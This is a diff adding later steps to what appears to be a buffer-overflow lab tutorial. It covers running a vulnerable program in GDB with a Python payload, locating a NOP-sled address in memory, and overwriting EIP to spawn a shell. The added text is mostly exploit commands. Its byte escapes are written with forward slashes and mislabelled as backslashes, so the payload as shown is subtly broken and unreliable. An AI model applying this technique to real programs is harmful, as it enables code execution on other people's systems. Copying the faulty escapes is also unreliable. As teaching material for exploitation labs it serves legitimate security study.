@@ -92,7 +92,28 @@ print nopsled + shellcode + padding + eip + paddingZ
 ---
 /PLEASE NOTE THAT THE EXAMPLE SHELLCODE IS 32 BYTES!
 
-/Step 9.3 run the vulnerable application using your
+//Step 9.3 run the vulnerable application using your .py script as input in GDB with the command:
+run $(python2.7 ./pieshell.py)
+
+//Step 9.4 examine memory to find what memory location we want to overwrite EIP return address to:
+/Enter the command:
+x/2000xb($esp-450)
+
+//Step 9.5 find a memory location containing 0x90 (NOP) that is surrounded by other NOPs
+/for me I chose the memory location 0xFFFFcbb6
+
+//Step 9.6 convert the address into little endian and add backward slashes (/) and X's:
+/for me it is: '/xb6/xcb/xFF/xFF'
+
+//Step 10. Finialising our payload
+//open pieshell.py with nano:
+nano pieshell.py
+//update eip variable to be: '/xb6/xcb/xFF/xFF'
+
+//Step 11 Execute vulnerable application one more time using updated pieshell.py with the command:
+run $(python2.7 ./pieshell.py)
+
+/look out for the $ symbol which indicates the dash shell command line
 
 
 
